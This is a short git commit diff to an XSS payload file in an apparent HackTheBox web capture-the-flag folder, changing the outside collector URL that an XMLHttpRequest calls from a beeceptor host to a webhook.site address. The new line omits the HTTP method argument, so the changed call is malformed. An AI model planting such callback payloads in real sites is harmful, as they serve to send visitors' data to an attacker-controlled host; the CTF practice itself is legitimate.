aa8e2925a47cf571d44b7e5e2c49ee3b15c6323b
calamarmou <57991950+calamarmou@users.noreply.github.com>
2023-01-15 16:59:54 +0000

    Update xss.js

--- htb/challenges/web/cursed_secret_party/xss.js
+++ htb/challenges/web/cursed_secret_party/xss.js
@@ -1,3 +1,3 @@
 var xhr = new XMLHttpRequest();
-xhr.open("GET", "https://htbtestlol.free.beeceptor.com", true);
+xhr.open("https://webhook.site/e5242b09-a509-4ae2-9ee6-05c93076c22b/imfromgithub", true);
 xhr.send();
